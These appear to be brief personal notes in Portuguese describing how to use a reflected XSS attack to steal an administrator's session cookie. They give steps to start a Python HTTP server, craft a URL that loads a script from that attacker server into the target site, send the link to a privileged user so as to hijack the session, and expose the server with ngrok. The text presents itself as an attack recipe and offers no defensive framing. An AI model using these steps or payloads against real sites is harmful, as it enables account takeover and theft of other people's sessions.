O XSS REFLECTED É USADO PARA CRIAR UM LINK COM ATAQUE XSS PARA ENVIAR PARA ALGUM ADMIN E RECEBER O COOKIE PARA TER ACESSO.

1.CRIAR UM SERVIDOR.
	FORMA DE CRIAR(ABRIR) SERVIDOR NO PYTHON PELO TERMINAL:
		'PYTHON3 -M HTTP.SERVER'

2.CRIAR UM SCRIPT EM JS OU HTML.

3.COLOCAR O SERVIDOR E O SCRIPT DENTRO DO SOURCE.
	EX:http://www.seusite.com/<script src='"servidor_criado"/script.js'></script>

4.MANDAR O LINK PARA ALGUÉM QUE TENHA ACESSO PARA PODER ROUBAR A SESSÃO.
OBS: O LINK SÓ PODE SER USADO POR PESSOAS QUE ESTEJAM USANDO O MESMO SERVIDOR LOCAL QUE VOCE.

PARA PODER COMPARTILHAR O LINK PARA REDES EXTERNAS PODE SE USAR A FERRAMENTA NGROK.
